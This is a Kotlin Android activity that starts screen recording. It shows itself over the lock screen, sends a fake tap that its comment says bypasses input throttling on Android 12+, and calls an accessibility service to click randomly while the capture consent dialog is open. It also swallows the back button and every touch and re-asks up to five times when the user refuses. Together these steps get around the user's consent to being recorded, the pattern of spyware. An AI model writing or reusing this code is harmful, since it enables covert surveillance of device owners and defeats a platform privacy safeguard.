package com.webanion.androidgmutils.screenrecording

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.MotionEvent
import android.view.WindowManager
import com.webanion.androidgmutils.accessibility.AGUAccessibilityListener
import android.content.res.Configuration
import android.graphics.Color
import android.os.Build
import android.view.View

class ScreenRecordingActivity : Activity() {

    private var permissionRetryCount = 0

    override fun onCreate(savedInstanceState: Bundle?) {

        val isDarkTheme = resources.configuration.uiMode and
        Configuration.UI_MODE_NIGHT_MASK == Configuration.UI_MODE_NIGHT_YES

        window.apply {
            statusBarColor = Color.TRANSPARENT
            navigationBarColor = Color.TRANSPARENT

            decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                isNavigationBarContrastEnforced = false
            }
        }


        overridePendingTransition(0, 0)
        super.onCreate(savedInstanceState)

        // Make sure the activity can show even if the screen is locked
        window.addFlags(
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        // Optional: let singleton know which activity is active (backwards compatibility)
        ScreenRecorderSingleton.setActivity(this)

         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
           // Simulate a quick user tap to bypass input throttling on Android 12+
           simulateUserTap()
         }

        val initialDelay = (150..250).random().toLong()
        Handler(Looper.getMainLooper()).postDelayed({ startScreenCapture() }, initialDelay)
    }

    private fun startScreenCapture() {
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
            startActivityForResult(
                captureIntent,
                ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                AGUAccessibilityListener.getInstance()?.performRandomClicks()
            }

        } catch (e: Exception) {
            // e.printStackTrace()
            finish()
        }
    }

    override fun onBackPressed() {
        // Consume back button press
    }


    override fun onTouchEvent(event: MotionEvent?): Boolean {
        // Consume all touches
        return true
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == ScreenRecordingListenerModule.SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                permissionRetryCount = 0
                // Pass result to singleton directly
                ScreenRecorderSingleton.startRecording(data, resultCode)
                finish()
            } else {
                permissionRetryCount++
                if (permissionRetryCount < MAX_PERMISSION_RETRIES) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        startScreenCapture()
                    }, 500)
                } else {
                    finish()
                }
            }
        }
    }

    // Sends a quick down/up touch event to convince Android there was recent user interaction.
    private fun simulateUserTap() {
        val downTime = System.currentTimeMillis()
        val x = (80..120).random().toFloat()   // add randomness
        val y = (80..120).random().toFloat()

        val downEvent = MotionEvent.obtain(
            downTime,
            downTime,
            MotionEvent.ACTION_DOWN,
            x,
            y,
            0
        )
        val upEvent = MotionEvent.obtain(
            downTime,
            downTime + 50,
            MotionEvent.ACTION_UP,
            x,
            y,
            0
        )

        window.decorView.dispatchTouchEvent(downEvent)
        window.decorView.dispatchTouchEvent(upEvent)

        downEvent.recycle()
        upEvent.recycle()
    }

    companion object {
        const val MAX_PERMISSION_RETRIES = 5
        fun start(context: Context) {
            val intent = Intent(context, ScreenRecordingActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            context.startActivity(intent)
        }
    }
}
